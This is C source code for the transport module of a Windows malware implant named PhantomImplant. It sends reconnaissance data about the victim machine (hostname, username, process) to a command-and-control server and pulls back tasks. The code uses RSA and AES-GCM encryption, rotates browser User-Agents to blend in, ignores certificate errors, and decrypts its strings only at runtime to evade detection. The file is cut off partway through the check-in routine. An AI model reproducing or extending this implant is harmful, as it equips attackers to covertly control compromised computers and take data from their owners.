/**
 * PhantomImplant - C2 Transport Module
 *
 * Implements the Phantom C2 protocol in C:
 *   Registration: RSA-OAEP-SHA256 key exchange → AES-256-GCM session
 *   Check-in:     AES-256-GCM encrypted envelopes over HTTPS
 *   Wire format:  JSON { "data": "<base64(envelope)>", "ts": <unix_ts> }
 *   Envelope:     [Version:1][Type:1][KeyID:8][PayloadLen:4][Payload:N]
 *   Serialization: Minimal msgpack (maps with string keys)
 *
 * Endpoints:
 *   POST /api/v1/auth   → Registration
 *   POST /api/v1/status → Check-in + task retrieval
 *
 * Built from Phantom C2 Go source (transport.go, envelope.go, crypto/)
 */

#include "transport.h"
#include "api.h"
#include "msgpack.h"
#include "strings.h"
#include <winhttp.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <stdio.h>
#include <time.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// =============================================
// Globals
// =============================================
static HINTERNET g_hSession  = NULL;
static HINTERNET g_hConnect  = NULL;
static IMPLANT_CONFIG g_Config = { 0 };
static BOOL g_bUseHTTPS = FALSE;

static const CHAR* g_UserAgents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
};
#define NUM_USER_AGENTS (sizeof(g_UserAgents) / sizeof(g_UserAgents[0]))

// =============================================
// Base64 encode (Windows CryptBinaryToStringA)
// =============================================
DWORD Base64Encode(IN PBYTE pInput, IN DWORD dwInputLen, OUT PCHAR pOutput, IN DWORD dwOutputLen) {
    DWORD dwSize = dwOutputLen;
    if (!CryptBinaryToStringA(pInput, dwInputLen, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, pOutput, &dwSize))
        return 0;
    return dwSize;
}

// =============================================
// Base64 decode
// =============================================
DWORD Base64Decode(IN PCHAR pInput, IN DWORD dwInputLen, OUT PBYTE pOutput, IN DWORD dwOutputLen) {
    DWORD dwSize = dwOutputLen;
    if (!CryptStringToBinaryA(pInput, dwInputLen, CRYPT_STRING_BASE64, pOutput, &dwSize, NULL, NULL))
        return 0;
    return dwSize;
}

// =============================================
// SHA-256 → first 8 bytes = KeyID
// =============================================
VOID ComputeKeyID(IN PBYTE pKey, OUT PBYTE pKeyID) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    BYTE bHash[32] = { 0 };

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
    BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
    BCryptHashData(hHash, pKey, AES_KEY_SIZE, 0);
    BCryptFinishHash(hHash, bHash, 32, 0);

    memcpy(pKeyID, bHash, SESSION_KEYID_SIZE);

    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
}

// =============================================
// AES-256-GCM Encrypt (nonce prepended to output)
// Output: [12-byte nonce][ciphertext + 16-byte tag]
// =============================================
BOOL AesGcmEncrypt(IN PBYTE pKey, IN PBYTE pPlain, IN DWORD dwPlainSize,
                   OUT PBYTE* ppCipher, OUT DWORD* pdwCipherSize) {

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL bRet = FALSE;

    BYTE bNonce[AES_GCM_NONCE_SIZE];
    BYTE bTag[AES_GCM_TAG_SIZE];
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;

    // Generate random nonce
    BCryptGenRandom(NULL, bNonce, AES_GCM_NONCE_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) goto _Done;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status)) goto _Done;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, AES_KEY_SIZE, 0);
    if (!NT_SUCCESS(status)) goto _Done;

    // Setup GCM auth info
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = bNonce;
    authInfo.cbNonce = AES_GCM_NONCE_SIZE;
    authInfo.pbTag = bTag;
    authInfo.cbTag = AES_GCM_TAG_SIZE;

    // Encrypt
    DWORD dwCipherLen = 0;
    PBYTE pCipherBuf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwPlainSize);
    if (!pCipherBuf) goto _Done;

    status = BCryptEncrypt(hKey, pPlain, dwPlainSize, &authInfo, NULL, 0, pCipherBuf, dwPlainSize, &dwCipherLen, 0);
    if (!NT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, pCipherBuf);
        goto _Done;
    }

    // Build output: [nonce][ciphertext][tag]
    DWORD dwTotalSize = AES_GCM_NONCE_SIZE + dwCipherLen + AES_GCM_TAG_SIZE;
    PBYTE pOutput = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwTotalSize);
    if (!pOutput) {
        HeapFree(GetProcessHeap(), 0, pCipherBuf);
        goto _Done;
    }

    memcpy(pOutput, bNonce, AES_GCM_NONCE_SIZE);
    memcpy(pOutput + AES_GCM_NONCE_SIZE, pCipherBuf, dwCipherLen);
    memcpy(pOutput + AES_GCM_NONCE_SIZE + dwCipherLen, bTag, AES_GCM_TAG_SIZE);

    HeapFree(GetProcessHeap(), 0, pCipherBuf);

    *ppCipher = pOutput;
    *pdwCipherSize = dwTotalSize;
    bRet = TRUE;

_Done:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bRet;
}

// =============================================
// AES-256-GCM Decrypt
// Input: [12-byte nonce][ciphertext][16-byte tag]
// =============================================
BOOL AesGcmDecrypt(IN PBYTE pKey, IN PBYTE pCipher, IN DWORD dwCipherSize,
                   OUT PBYTE* ppPlain, OUT DWORD* pdwPlainSize) {

    if (dwCipherSize < AES_GCM_NONCE_SIZE + AES_GCM_TAG_SIZE)
        return FALSE;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL bRet = FALSE;

    PBYTE pNonce = pCipher;
    DWORD dwDataLen = dwCipherSize - AES_GCM_NONCE_SIZE - AES_GCM_TAG_SIZE;
    PBYTE pData = pCipher + AES_GCM_NONCE_SIZE;
    PBYTE pTag = pCipher + AES_GCM_NONCE_SIZE + dwDataLen;

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) goto _Done;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!NT_SUCCESS(status)) goto _Done;

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, AES_KEY_SIZE, 0);
    if (!NT_SUCCESS(status)) goto _Done;

    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = pNonce;
    authInfo.cbNonce = AES_GCM_NONCE_SIZE;
    authInfo.pbTag = pTag;
    authInfo.cbTag = AES_GCM_TAG_SIZE;

    PBYTE pPlainBuf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwDataLen);
    if (!pPlainBuf) goto _Done;

    DWORD dwPlainLen = 0;
    status = BCryptDecrypt(hKey, pData, dwDataLen, &authInfo, NULL, 0, pPlainBuf, dwDataLen, &dwPlainLen, 0);
    if (!NT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, pPlainBuf);
        goto _Done;
    }

    *ppPlain = pPlainBuf;
    *pdwPlainSize = dwPlainLen;
    bRet = TRUE;

_Done:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bRet;
}

// =============================================
// RSA-OAEP-SHA256 Encrypt
// =============================================
BOOL RsaOaepEncrypt(IN PBYTE pPubKeyDer, IN DWORD dwPubKeyLen,
                    IN PBYTE pPlain, IN DWORD dwPlainSize,
                    OUT PBYTE* ppCipher, OUT DWORD* pdwCipherSize) {

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL bRet = FALSE;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) goto _Done;

    // Import DER-encoded public key
    status = BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB, &hKey, pPubKeyDer, dwPubKeyLen, 0);
    if (!NT_SUCCESS(status)) {
        // Try PKCS1 format
        // Decode DER to CERT_PUBLIC_KEY_INFO first
        CERT_PUBLIC_KEY_INFO* pPubKeyInfo = NULL;
        DWORD dwPubKeyInfoLen = 0;

        if (CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO,
            pPubKeyDer, dwPubKeyLen, CRYPT_DECODE_ALLOC_FLAG, NULL, &pPubKeyInfo, &dwPubKeyInfoLen)) {

            if (!CryptImportPublicKeyInfoEx2(X509_ASN_ENCODING, pPubKeyInfo, 0, NULL, &hKey)) {
                LocalFree(pPubKeyInfo);
                goto _Done;
            }
            LocalFree(pPubKeyInfo);
        } else {
            goto _Done;
        }
    }

    // OAEP padding with SHA-256
    BCRYPT_OAEP_PADDING_INFO padInfo = { BCRYPT_SHA256_ALGORITHM, NULL, 0 };

    // Get required output size
    DWORD dwCipherLen = 0;
    status = BCryptEncrypt(hKey, pPlain, dwPlainSize, &padInfo, NULL, 0, NULL, 0, &dwCipherLen, BCRYPT_PAD_OAEP);
    if (!NT_SUCCESS(status)) goto _Done;

    PBYTE pCipherBuf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwCipherLen);
    if (!pCipherBuf) goto _Done;

    status = BCryptEncrypt(hKey, pPlain, dwPlainSize, &padInfo, NULL, 0, pCipherBuf, dwCipherLen, &dwCipherLen, BCRYPT_PAD_OAEP);
    if (!NT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, pCipherBuf);
        goto _Done;
    }

    *ppCipher = pCipherBuf;
    *pdwCipherSize = dwCipherLen;
    bRet = TRUE;

_Done:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bRet;
}

// =============================================
// Build Envelope bytes: [Ver:1][Type:1][KeyID:8][Len:4][Payload:N]
// =============================================
static DWORD BuildEnvelope(BYTE bVersion, BYTE bType, PBYTE pKeyID, PBYTE pPayload, DWORD dwPayloadLen, PBYTE pOutput) {
    DWORD offset = 0;
    pOutput[offset++] = bVersion;
    pOutput[offset++] = bType;
    memcpy(pOutput + offset, pKeyID, SESSION_KEYID_SIZE);
    offset += SESSION_KEYID_SIZE;

    // Big-endian payload length
    pOutput[offset++] = (BYTE)((dwPayloadLen >> 24) & 0xFF);
    pOutput[offset++] = (BYTE)((dwPayloadLen >> 16) & 0xFF);
    pOutput[offset++] = (BYTE)((dwPayloadLen >> 8) & 0xFF);
    pOutput[offset++] = (BYTE)(dwPayloadLen & 0xFF);

    memcpy(pOutput + offset, pPayload, dwPayloadLen);
    offset += dwPayloadLen;
    return offset;
}

// =============================================
// Wrap envelope in JSON: {"data":"<base64>","ts":<unix>}
// =============================================
static DWORD WrapForHTTP(PBYTE pEnvelope, DWORD dwEnvLen, PCHAR pJsonOutput, DWORD dwJsonSize) {
    // Base64 encode the envelope
    CHAR szBase64[8192] = { 0 };
    DWORD dwB64Len = Base64Encode(pEnvelope, dwEnvLen, szBase64, sizeof(szBase64));
    if (dwB64Len == 0) return 0;

    // Build JSON
    DWORD dwWritten = (DWORD)sprintf_s(pJsonOutput, dwJsonSize,
        "{\"data\":\"%s\",\"ts\":%lld}", szBase64, (long long)time(NULL));
    return dwWritten;
}

// =============================================
// Minimal msgpack encoder for registration
// Encodes a flat map of string keys → string values
// =============================================
static DWORD MsgpackEncodeRegistration(
    PCHAR szHostname, PCHAR szUsername, PCHAR szOS, PCHAR szArch,
    DWORD dwPID, PCHAR szProcessName, PCHAR szInternalIP,
    PBYTE pOutput, DWORD dwOutputSize) {

    DWORD offset = 0;

    // fixmap with 7 entries: 0x87
    pOutput[offset++] = 0x80 | 7;

    // Helper macro: write fixstr key + fixstr value
    #define MSGPACK_STR(key, val) do { \
        DWORD klen = (DWORD)strlen(key); \
        DWORD vlen = (DWORD)strlen(val); \
        pOutput[offset++] = 0xA0 | (klen & 0x1F); \
        memcpy(pOutput + offset, key, klen); offset += klen; \
        if (vlen <= 31) { \
            pOutput[offset++] = 0xA0 | (vlen & 0x1F); \
        } else { \
            pOutput[offset++] = 0xD9; \
            pOutput[offset++] = (BYTE)vlen; \
        } \
        memcpy(pOutput + offset, val, vlen); offset += vlen; \
    } while(0)

    // Write key-value pairs (runtime-decrypted field names)
    #define MSGPACK_ENC_STR(encArr, encLen, val) do { \
        CHAR _k[32]; memcpy(_k, encArr, encLen + 1); \
        DecryptString(_k, encLen); \
        MSGPACK_STR(_k, val); \
        ZeroString(_k, encLen); \
    } while(0)

    MSGPACK_ENC_STR(g_EncHostname, ENC_HOSTNAME_LEN, szHostname);
    MSGPACK_ENC_STR(g_EncUsername, ENC_USERNAME_LEN, szUsername);
    MSGPACK_ENC_STR(g_EncOs, ENC_OS_LEN, szOS);
    MSGPACK_ENC_STR(g_EncArch, ENC_ARCH_LEN, szArch);

    // PID as uint32: decrypted key + uint32 value
    {
        CHAR pidKey[8]; memcpy(pidKey, g_EncPid, ENC_PID_LEN + 1);
        DecryptString(pidKey, ENC_PID_LEN);
        DWORD klen = ENC_PID_LEN;
        pOutput[offset++] = 0xA0 | klen;
        memcpy(pOutput + offset, pidKey, klen); offset += klen;
        ZeroString(pidKey, ENC_PID_LEN);
        pOutput[offset++] = 0xCE; // uint32
        pOutput[offset++] = (BYTE)((dwPID >> 24) & 0xFF);
        pOutput[offset++] = (BYTE)((dwPID >> 16) & 0xFF);
        pOutput[offset++] = (BYTE)((dwPID >> 8) & 0xFF);
        pOutput[offset++] = (BYTE)(dwPID & 0xFF);
    }

    MSGPACK_ENC_STR(g_EncProcessName, ENC_PROCESS_NAME_LEN, szProcessName);
    MSGPACK_ENC_STR(g_EncInternalIp, ENC_INTERNAL_IP_LEN, szInternalIP);
    #undef MSGPACK_ENC_STR

    #undef MSGPACK_STR
    return offset;
}

// =============================================
// Collect system information
// =============================================
VOID CollectSysInfo(PCHAR szHostname, PCHAR szUsername, PCHAR szOS,
                           PCHAR szArch, DWORD* pdwPID, PCHAR szProcessName, PCHAR szIP) {
    DWORD dwSize;

    // Hostname
    dwSize = MAX_COMPUTERNAME_LENGTH + 1;
    GetComputerNameA(szHostname, &dwSize);

    // Username
    dwSize = 256;
    GetUserNameA(szUsername, &dwSize);

    // OS
    strcpy(szOS, "windows");

    // Arch
#ifdef _WIN64
    strcpy(szArch, "amd64");
#else
    strcpy(szArch, "x86");
#endif

    // PID
    *pdwPID = GetCurrentProcessId();

    // Process name (just use our own exe name)
    GetModuleFileNameA(NULL, szProcessName, MAX_PATH);
    // Extract just the filename
    PCHAR pSlash = strrchr(szProcessName, '\\');
    if (pSlash) memmove(szProcessName, pSlash + 1, strlen(pSlash + 1) + 1);

    // Internal IP (simplified - use 127.0.0.1 as fallback)
    strcpy(szIP, "127.0.0.1");
}

// =============================================
// HTTP POST to server
// =============================================
static BOOL HttpPost(PCHAR szPath, PBYTE pBody, DWORD dwBodyLen, PBYTE* ppResponse, DWORD* pdwResponseLen) {

    HINTERNET hRequest = NULL;
    BOOL bRet = FALSE;

    // Convert path to wide string
    WCHAR wszPath[256] = { 0 };
    MultiByteToWideChar(CP_UTF8, 0, szPath, -1, wszPath, 256);

    // Pick random User-Agent
    WCHAR wszUA[512] = { 0 };
    MultiByteToWideChar(CP_UTF8, 0, g_UserAgents[GetTickCount() % NUM_USER_AGENTS], -1, wszUA, 512);

    // Use HTTPS flag only if server URL starts with https://
    DWORD dwReqFlags = g_bUseHTTPS ? WINHTTP_FLAG_SECURE : 0;
    hRequest = WinHttpOpenRequest(g_hConnect, L"POST", wszPath, NULL, WINHTTP_NO_REFERER,
                                  WINHTTP_DEFAULT_ACCEPT_TYPES, dwReqFlags);
    if (!hRequest) return FALSE;

    // Ignore certificate errors for HTTPS (self-signed C2 certs)
    if (g_bUseHTTPS) {
        DWORD dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                        SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));
    }

    // Set headers (Content-Type decrypted at runtime)
    CHAR szCT[64]; memcpy(szCT, g_EncContentType, ENC_CONTENT_TYPE_LEN + 1);
    DecryptString(szCT, ENC_CONTENT_TYPE_LEN);
    WCHAR wszCT[64] = { 0 };
    MultiByteToWideChar(CP_UTF8, 0, szCT, -1, wszCT, 64);
    ZeroString(szCT, ENC_CONTENT_TYPE_LEN);
    WinHttpAddRequestHeaders(hRequest, wszCT, -1, WINHTTP_ADDREQ_FLAG_ADD);

    WCHAR wszUAHeader[600] = { 0 };
    wsprintfW(wszUAHeader, L"User-Agent: %s", wszUA);
    WinHttpAddRequestHeaders(hRequest, wszUAHeader, -1, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    // Send request
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, pBody, dwBodyLen, dwBodyLen, 0))
        goto _Done;

    if (!WinHttpReceiveResponse(hRequest, NULL))
        goto _Done;

    // Read response
    DWORD dwTotalRead = 0;
    DWORD dwBufSize = 4096;
    PBYTE pBuf = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwBufSize);
    if (!pBuf) goto _Done;

    DWORD dwBytesRead = 0;
    while (WinHttpReadData(hRequest, pBuf + dwTotalRead, dwBufSize - dwTotalRead - 1, &dwBytesRead)) {
        if (dwBytesRead == 0) break;
        dwTotalRead += dwBytesRead;
        if (dwTotalRead >= dwBufSize - 256) {
            dwBufSize *= 2;
            PBYTE pNew = (PBYTE)HeapReAlloc(GetProcessHeap(), 0, pBuf, dwBufSize);
            if (!pNew) { HeapFree(GetProcessHeap(), 0, pBuf); goto _Done; }
            pBuf = pNew;
        }
    }
    pBuf[dwTotalRead] = '\0';

    *ppResponse = pBuf;
    *pdwResponseLen = dwTotalRead;
    bRet = TRUE;

_Done:
    if (hRequest) WinHttpCloseHandle(hRequest);
    return bRet;
}

// =============================================
// TransportInit - Setup WinHTTP session
// =============================================
BOOL TransportInit(PIMPLANT_CONFIG pConfig) {
    memcpy(&g_Config, pConfig, sizeof(IMPLANT_CONFIG));

    // Parse URL to extract host and port
    WCHAR wszHost[256] = { 0 };
    INTERNET_PORT nPort = INTERNET_DEFAULT_HTTPS_PORT;

    // Simple URL parse: skip "https://" then extract host:port
    PCHAR pHost = g_Config.szServerURL;
    if (strncmp(pHost, "https://", 8) == 0) { pHost += 8; g_bUseHTTPS = TRUE; }
    else if (strncmp(pHost, "http://", 7) == 0) { pHost += 7; nPort = INTERNET_DEFAULT_HTTP_PORT; g_bUseHTTPS = FALSE; }

    CHAR szHost[256] = { 0 };
    PCHAR pColon = strchr(pHost, ':');
    if (pColon) {
        strncpy(szHost, pHost, pColon - pHost);
        nPort = (INTERNET_PORT)atoi(pColon + 1);
    } else {
        PCHAR pSlash = strchr(pHost, '/');
        if (pSlash) strncpy(szHost, pHost, pSlash - pHost);
        else strcpy(szHost, pHost);
    }

    MultiByteToWideChar(CP_UTF8, 0, szHost, -1, wszHost, 256);

    g_hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_hSession) return FALSE;

    g_hConnect = WinHttpConnect(g_hSession, wszHost, nPort, 0);
    if (!g_hConnect) return FALSE;

    return TRUE;
}

// =============================================
// TransportRegister - RSA key exchange + registration
// =============================================
BOOL TransportRegister(PSESSION pSession) {

    // 1. Generate random AES-256 session key
    BCryptGenRandom(NULL, pSession->bSessionKey, AES_KEY_SIZE, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    // 2. Compute KeyID = SHA256(session_key)[:8]
    ComputeKeyID(pSession->bSessionKey, pSession->bKeyID);

    // 3. Collect system info
    CHAR szHostname[256] = { 0 }, szUsername[256] = { 0 }, szOS[32] = { 0 };
    CHAR szArch[16] = { 0 }, szProcessName[MAX_PATH] = { 0 }, szIP[64] = { 0 };
    DWORD dwPID = 0;
    CollectSysInfo(szHostname, szUsername, szOS, szArch, &dwPID, szProcessName, szIP);

    // 4. Msgpack serialize registration
    BYTE bMsgpack[2048] = { 0 };
    DWORD dwMsgpackLen = MsgpackEncodeRegistration(szHostname, szUsername, szOS, szArch,
                                                    dwPID, szProcessName, szIP,
                                                    bMsgpack, sizeof(bMsgpack));

    // 5. Build blob: [32-byte AES key][msgpack payload]
    DWORD dwBlobLen = AES_KEY_SIZE + dwMsgpackLen;
    PBYTE pBlob = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwBlobLen);
    memcpy(pBlob, pSession->bSessionKey, AES_KEY_SIZE);
    memcpy(pBlob + AES_KEY_SIZE, bMsgpack, dwMsgpackLen);

    // 6. RSA-OAEP encrypt blob with server's public key
    PBYTE pEncrypted = NULL;
    DWORD dwEncryptedLen = 0;
    BOOL bResult = RsaOaepEncrypt(g_Config.bServerPubKey, g_Config.dwServerPubKeyLen,
                                   pBlob, dwBlobLen, &pEncrypted, &dwEncryptedLen);
    HeapFree(GetProcessHeap(), 0, pBlob);
    if (!bResult) return FALSE;

    // 7. Build envelope
    BYTE bEnvelope[4096] = { 0 };
    BYTE bEmptyKeyID[SESSION_KEYID_SIZE] = { 0 }; // Registration uses empty KeyID
    DWORD dwEnvLen = BuildEnvelope(PHANTOM_PROTOCOL_VERSION, MSG_REGISTER_REQUEST,
                                    bEmptyKeyID, pEncrypted, dwEncryptedLen, bEnvelope);
    HeapFree(GetProcessHeap(), 0, pEncrypted);

    // 8. Wrap in JSON
    CHAR szJson[16384] = { 0 };
    DWORD dwJsonLen = WrapForHTTP(bEnvelope, dwEnvLen, szJson, sizeof(szJson));
    if (dwJsonLen == 0) return FALSE;

    // 9. POST to /api/v1/auth (decrypted at runtime)
    PBYTE pResponse = NULL;
    DWORD dwResponseLen = 0;
    CHAR szRegURI[32]; memcpy(szRegURI, g_EncRegisterURI, ENC_REGISTER_URI_LEN + 1);
    DecryptString(szRegURI, ENC_REGISTER_URI_LEN);
    BOOL bPostOk = HttpPost(szRegURI, (PBYTE)szJson, dwJsonLen, &pResponse, &dwResponseLen);
    ZeroString(szRegURI, ENC_REGISTER_URI_LEN);
    if (!bPostOk) return FALSE;

    // 10. Parse response: JSON → base64 → envelope → AES-GCM decrypt → msgpack
    if (!pResponse || dwResponseLen == 0) return FALSE;

    // Extract base64 "data" field from JSON: {"data":"...", "ts":...}
    CHAR szMarker[16]; memcpy(szMarker, g_EncDataMarker, ENC_DATA_MARKER_LEN + 1);
    DecryptString(szMarker, ENC_DATA_MARKER_LEN);
    PCHAR pDataStart = strstr((PCHAR)pResponse, szMarker);
    ZeroString(szMarker, ENC_DATA_MARKER_LEN);
    if (!pDataStart) { HeapFree(GetProcessHeap(), 0, pResponse); return FALSE; }
    pDataStart += ENC_DATA_MARKER_LEN;

    PCHAR pDataEnd = strchr(pDataStart, '"');
    if (!pDataEnd) { HeapFree(GetProcessHeap(), 0, pResponse); return FALSE; }

    DWORD dwB64Len = (DWORD)(pDataEnd - pDataStart);

    // Base64 decode → envelope bytes
    BYTE bEnvBuf[4096] = { 0 };
    DWORD dwRespEnvLen = Base64Decode(pDataStart, dwB64Len, bEnvBuf, sizeof(bEnvBuf));
    HeapFree(GetProcessHeap(), 0, pResponse);

    if (dwRespEnvLen < 14) return FALSE;

    // Parse envelope: [Ver:1][Type:1][KeyID:8][PayloadLen:4][Payload]
    BYTE bRespType = bEnvBuf[1];
    if (bRespType != MSG_REGISTER_RESPONSE) return FALSE;

    DWORD dwPayloadLen = (bEnvBuf[10] << 24) | (bEnvBuf[11] << 16) | (bEnvBuf[12] << 8) | bEnvBuf[13];
    if (14 + dwPayloadLen > dwRespEnvLen) return FALSE;

    PBYTE pEncPayload2 = bEnvBuf + 14;

    // AES-GCM decrypt with our session key
    PBYTE pDecrypted = NULL;
    DWORD dwDecryptedLen = 0;
    if (!AesGcmDecrypt(pSession->bSessionKey, pEncPayload2, dwPayloadLen, &pDecrypted, &dwDecryptedLen))
        return FALSE;

    // Parse msgpack RegisterResponse
    INT nSleep = 10, nJitter = 20;
    CHAR szName[64] = { 0 };
    BOOL bParsed = MsgpackParseRegisterResponse(pDecrypted, dwDecryptedLen,
        pSession->szAgentID, sizeof(pSession->szAgentID),
        szName, sizeof(szName), &nSleep, &nJitter);

    HeapFree(GetProcessHeap(), 0, pDecrypted);

    if (bParsed) {
        strncpy(pSession->szAgentName, szName, sizeof(pSession->szAgentName) - 1);
        pSession->dwSleepMs = (DWORD)(nSleep * 1000);
        pSession->dwJitterPct = (DWORD)nJitter;
        pSession->bRegistered = TRUE;
    } else {
        // Fallback: registration succeeded but response parse failed
        strcpy(pSession->szAgentID, "unknown");
        pSession->dwSleepMs = g_Config.dwSleepMs;
        pSession->dwJitterPct = g_Config.dwJitterPct;
        pSession->bRegistered = TRUE;
    }

    return TRUE;
}

// =============================================
// TransportCheckIn - Send results, receive tasks
// =============================================
BOOL TransportCheckIn(PSESSION pSession, PC2_RESULT pResults, DWORD dwResultCount,
                      PC2_TASK* ppTasks, DWORD* pdwTaskCount) {

    // 1. Build check-in msgpack (simplified: just agent_id + empty results)
    BYTE bPayload[4096] = { 0 };
    DWORD offset = 0;

    // fixmap with 2 keys
    bPayload[offset++] = 0x82;

    // "agent_id" → session agent_id (decrypted at runtime)
    CHAR szAidKey[16]; memcpy(szAidKey, g_EncAgentId, ENC_AGENT_ID_LEN + 1);
    DecryptString(szAidKey, ENC_AGENT_ID_LEN);
    DWORD klen = ENC_AGENT_ID_LEN;
    bPayload[offset++] = 0xA0 | klen;
    memcpy(bPayload + offset, szAidKey, klen); offset += klen;
    ZeroString(szAidKey, ENC_AGENT_ID_LEN);
    DWORD vlen = (DWORD)strlen(pSession->szAgentID);
    if (vlen <= 31) {
        bPayload[offset++] = 0xA0 | (vlen & 0x1F);
    } else {
        bPayload[offset++] = 0xD9;
        bPayload[offset++] = (BYTE)vlen;
    }
    memcpy(bPayload + offset, pSession->szAgentID, vlen); offset += vlen;

    // "results" → empty array (decrypted at runtime)
    CHAR szResKey[16]; memcpy(szResKey, g_EncResults, ENC_RESULTS_LEN + 1);
    DecryptString(szResKey, ENC_RESULTS_LEN);
    klen = ENC_RESULTS_LEN;
    bPayload[offset++] = 0xA0 | klen;
    memcpy(bPayload + offset, szResKey, klen); offset += klen;
    ZeroString(szResKey, ENC_RESULTS_LEN);
    bPayload[offset++] = 0x90; // empty fixarray

    // 2. AES-GCM encrypt
    PBYTE pEncPayload = NULL;
    DWORD dwEncLen = 0;
    if (!AesGcmEncrypt(pSession->bSessionKey, bPayload, offset, &pEncPayload, &dwEncLen))
        return FALSE;

    // 3. Build envelope
    BYTE bEnvelope[8192] = { 0 };
    DWORD dwEnvLen = BuildEnvelope(PHANTOM_PROTOCOL_VERSION, MSG_CHECKIN,
                                    pSession->bKeyID, pEncPayload, dwEncLen, bEnvelope);
    HeapFree(GetProcessHeap(), 0, pEncPayload);

    // 4. Wrap in JSON
    CHAR szJson[16384] = { 0 };
    DWORD dwJsonLen = WrapForHTTP(bEnvelope, dwEnvLen, szJson, sizeof(szJson));
    if (dwJsonLen == 0) return FALSE;

    // 5. POST to /api/v1/status (decrypted at runtime)
    PBYTE pResponse = NULL;
    DWORD dwResponseLen = 0;
    CHAR szChkURI[32]; memcpy(szChkURI, g_EncCheckInURI, ENC_CHECKIN_URI_LEN + 1);
    DecryptString(szChkURI, ENC_CHECKIN_URI_LEN);
    BOOL bChkOk = HttpPost(szChkURI, (PBYTE)szJson, dwJsonLen, &pResponse, &dwResponseLen);
    ZeroString(szChkURI, ENC_CHECKIN_URI_LEN);
    if (!bChkOk) return FALSE;

    // 6. Parse tasks from response: JSON → base64 → envelope → AES-GCM decrypt → msgpack
    if (!pResponse || dwResponseLen == 0) {
        *ppTasks = NULL;
        *pdwTaskCount = 0;
        return TRUE; // No response is OK (server may have no tasks)
    }

